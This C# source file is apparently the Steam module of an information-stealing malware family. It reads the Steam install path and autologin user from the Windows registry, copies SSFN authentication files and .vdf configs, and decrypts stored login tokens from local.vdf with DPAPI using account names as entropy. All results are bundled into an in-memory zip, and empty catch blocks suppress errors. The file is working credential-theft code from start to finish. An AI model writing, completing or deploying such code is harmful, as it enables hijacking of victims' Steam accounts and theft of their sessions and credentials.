using Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Targets.Games
{
	public class Steam : ITarget
	{
		public void Collect(InMemoryZip zip, Counter counter)
		{
			// Steam-Pfad aus Registry lesen
			RegistryKey steamKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
			if (steamKey == null || steamKey.GetValue("SteamPath") == null)
				return;

			string steamPath = steamKey.GetValue("SteamPath").ToString();
			if (!Directory.Exists(steamPath))
				return;

			string baseFolder = nameof(Steam);
			Counter.CounterApplications counterApps = new Counter.CounterApplications();
			counterApps.Name = nameof(Steam);

			// 1. Apps aus Registry sammeln
			CollectAppsFromRegistry(steamKey, baseFolder, zip, counterApps);

			// 2. SSFN-Dateien sammeln
			CollectSsfnFiles(steamPath, baseFolder, zip, counterApps);

			// 3. Config-Dateien (.vdf) sammeln
			CollectConfigFiles(steamPath, baseFolder, zip, counterApps);

			// 4. Steam-Info aus Registry
			CollectSteamInfo(steamKey, baseFolder, zip, counterApps);

			// 5. Token-Dateien entschlüsseln
			CollectAndDecryptTokens(baseFolder, zip, counterApps);

			if (counterApps.Files.Count > 0)
			{
				counterApps.Files.Add("Steam\\");
				counter.Games.Add(counterApps);
			}
		}

		private void CollectAppsFromRegistry(RegistryKey steamKey, string baseFolder, InMemoryZip zip, Counter.CounterApplications counterApps)
		{
			try
			{
				RegistryKey appsKey = steamKey.OpenSubKey("Apps");
				if (appsKey == null)
					return;

				List<string> appInfos = new List<string>();

				foreach (string subKeyName in appsKey.GetSubKeyNames())
				{
					using (RegistryKey appKey = steamKey.OpenSubKey("Apps\\" + subKeyName))
					{
						if (appKey == null)
							continue;

						string appName = appKey.GetValue("Name") as string ?? "Unknown";
						int? installed = appKey.GetValue("Installed") as int?;
						int? running = appKey.GetValue("Running") as int?;
						int? updating = appKey.GetValue("Updating") as int?;

						string installedText = installed == 1 ? "Yes" : "No";
						string runningText = running == 1 ? "Yes" : "No";
						string updatingText = updating == 1 ? "Yes" : "No";

						appInfos.Add($"Application: {appName}\n\tGameID: {subKeyName}\n\tInstalled: {installedText}\n\tRunning: {runningText}\n\tUpdating: {updatingText}");
					}
				}

				if (appInfos.Count > 0)
				{
					string entryPath = Path.Combine(baseFolder, "Apps.txt");
					zip.AddTextFile(entryPath, string.Join("\n\n", appInfos));
					counterApps.Files.Add("Software\\Valve\\Steam\\Apps => " + entryPath);
				}
			}
			catch { }
		}

		private void CollectSsfnFiles(string steamPath, string baseFolder, InMemoryZip zip, Counter.CounterApplications counterApps)
		{
			try
			{
				foreach (string file in Directory.GetFiles(steamPath))
				{
					if (file.Contains("ssfn"))
					{
						byte[] content = File.ReadAllBytes(file);
						string entryPath = Path.Combine(baseFolder, "ssfn", Path.GetFileName(file));
						zip.AddFile(entryPath, content);
						counterApps.Files.Add($"{file} => {entryPath}");
					}
				}
			}
			catch { }
		}

		private void CollectConfigFiles(string steamPath, string baseFolder, InMemoryZip zip, Counter.CounterApplications counterApps)
		{
			try
			{
				string configPath = Path.Combine(steamPath, "config");
				if (!Directory.Exists(configPath))
					return;

				foreach (string file in Directory.GetFiles(configPath, "*.vdf"))
				{
					string entryPath = Path.Combine(baseFolder, "configs", Path.GetFileName(file));
					zip.AddFile(entryPath, File.ReadAllBytes(file));
					counterApps.Files.Add($"{file} => {entryPath}");
				}
			}
			catch { }
		}

		private void CollectSteamInfo(RegistryKey steamKey, string baseFolder, InMemoryZip zip, Counter.CounterApplications counterApps)
		{
			try
			{
				string autoLoginUser = steamKey.GetValue("AutoLoginUser")?.ToString() ?? "Unknown";
				int? rememberPassword = steamKey.GetValue("RememberPassword") as int?;
				string rememberText = rememberPassword == 1 ? "Yes" : "No";

				string text = $"Autologin User: {autoLoginUser}\nRemember password: {rememberText}";
				string entryPath = Path.Combine(baseFolder, "SteamInfo.txt");

				zip.AddTextFile(entryPath, text);
				counterApps.Files.Add("Software\\Valve\\Steam => " + entryPath);
			}
			catch { }
		}

		private void CollectAndDecryptTokens(string baseFolder, InMemoryZip zip, Counter.CounterApplications counterApps)
		{
			try
			{
				// Mögliche Pfade für local.vdf und loginusers.vdf
				string[] localVdfPaths = new string[]
				{
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf"),
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Steam", "local.vdf")
				};

				string[] loginUsersPaths = new string[]
				{
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf"),
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "config", "loginusers.vdf")
				};

				// Erste existierende Datei finden
				string localVdfPath = localVdfPaths.FirstOrDefault(File.Exists);
				string loginUsersPath = loginUsersPaths.FirstOrDefault(File.Exists);

				if (string.IsNullOrEmpty(localVdfPath) || string.IsNullOrEmpty(loginUsersPath))
					return;

				// Patterns für AccountNames und Tokens
				string accountNamePattern = "\"AccountName\"\\s*\"([^\"]+)\"";
				string tokenPattern = "([a-fA-F0-9]{500,2000})";

				string loginUsersContent = File.ReadAllText(loginUsersPath);
				string localVdfContent = File.ReadAllText(localVdfPath);

				MatchCollection accountNameMatches = Regex.Matches(loginUsersContent, accountNamePattern);
				MatchCollection tokenMatches = Regex.Matches(localVdfContent, tokenPattern);

				if (accountNameMatches.Count == 0 || tokenMatches.Count == 0)
					return;

				List<string> decryptedTokens = new List<string>();

				foreach (Match accountMatch in accountNameMatches)
				{
					string accountName = accountMatch.Groups[1].Value;
					byte[] accountNameBytes = Encoding.UTF8.GetBytes(accountName);

					foreach (Match tokenMatch in tokenMatches)
					{
						string hexToken = tokenMatch.Value;

						// Hex-String in Byte-Array konvertieren
						byte[] encryptedToken = Enumerable.Range(0, hexToken.Length / 2)
							.Select(x => Convert.ToByte(hexToken.Substring(x * 2, 2), 16))
							.ToArray();

						try
						{
							byte[] decryptedToken = ProtectedData.Unprotect(encryptedToken, accountNameBytes, DataProtectionScope.LocalMachine);
							decryptedTokens.Add(Encoding.UTF8.GetString(decryptedToken));
							break; // Token gefunden, weiter mit nächstem Account
						}
						catch
						{
							// Entschlüsselung fehlgeschlagen, nächsten Token versuchen
						}
					}
				}

				if (decryptedTokens.Count > 0)
				{
					string entryPath = Path.Combine(baseFolder, "Token.txt");
					zip.AddTextFile(entryPath, string.Join("\n", decryptedTokens));
					counterApps.Files.Add($"{localVdfPath} => {entryPath}");
					counterApps.Files.Add($"{loginUsersPath} => {entryPath}");
				}
			}
			catch { }
		}
	}
}